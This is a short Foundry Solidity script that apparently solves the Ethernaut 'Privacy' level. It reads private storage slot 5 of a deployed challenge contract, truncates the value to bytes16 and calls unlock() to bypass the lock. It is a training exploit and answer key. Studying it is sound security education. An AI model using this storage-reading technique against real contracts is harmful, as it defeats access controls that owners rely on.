// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Level12.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level12Sol is Script{

    Privacy public instance = Privacy(0x80AeDd671Abb04118998A8baAd7B879aA53756f9) ;

    function run() external {

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot5_data = vm.load(address(instance),bytes32(uint256(5)));

        instance.unlock(bytes16(slot5_data));

        vm.stopBroadcast();
    }
}